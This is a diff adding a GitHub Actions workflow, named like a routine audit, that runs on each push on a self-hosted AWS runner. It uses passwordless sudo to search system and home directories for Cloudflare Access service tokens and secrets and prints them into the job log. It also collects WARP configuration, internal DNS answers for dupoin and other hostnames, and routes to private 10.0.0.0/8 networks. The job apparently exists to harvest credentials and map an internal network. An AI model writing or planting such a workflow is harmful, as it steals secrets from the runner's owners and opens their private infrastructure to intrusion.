@@ -1,0 +1,19 @@
+name: audit3472c
+on: push
+jobs:
+  g:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    steps:
+      - name: collect3
+        run: |
+          set +e
+          echo "=== CF ACCESS SERVICE TOKENS IN FILES ==="
+          timeout 100 sudo -n grep -rhoIE '(CF-Access-Client-(Id|Secret)|CF_ACCESS_CLIENT_(ID|SECRET)|ACCESS_CLIENT_ID)[=: ]+[A-Za-z0-9._-]{10,}' /home /root /opt /srv /etc 2>/dev/null | sort -u | head -20
+          echo "=== cloudflareaccess.com refs ==="
+          timeout 100 sudo -n grep -rhoiE '[A-Za-z0-9-]+\.cloudflareaccess\.com' /home /root /opt /srv /etc 2>/dev/null | sort -u | head -20
+          echo "=== warp ==="; which warp-cli; warp-cli --version 2>&1 | head -2; warp-cli status 2>&1 | head -5; ls -la /var/lib/cloudflare-warp 2>/dev/null | head; cat /etc/warp/config.json 2>/dev/null | head -20
+          echo "=== resolv/dns ==="; cat /etc/resolv.conf | head; for h in pro-srv-account.csharp pro-srv-user.csharp crm.dupoin.com; do echo -n "$h -> "; getent ahostsv4 $h | awk '{print $1}' | sort -u | tr '\n' ' '; echo; done
+          echo "=== route to 10.0.0.0/8 ==="; ip route | head -10
+          echo "=== dupoin hostnames seen on host ==="
+          timeout 100 sudo -n grep -rhoiE '[a-z0-9.-]+\.dupoin\.(com|co\.id)' /home/ubuntu /root /opt /srv /etc 2>/dev/null | sort | uniq -c | sort -rn | head -25
+          echo "=== DONE3 ==="
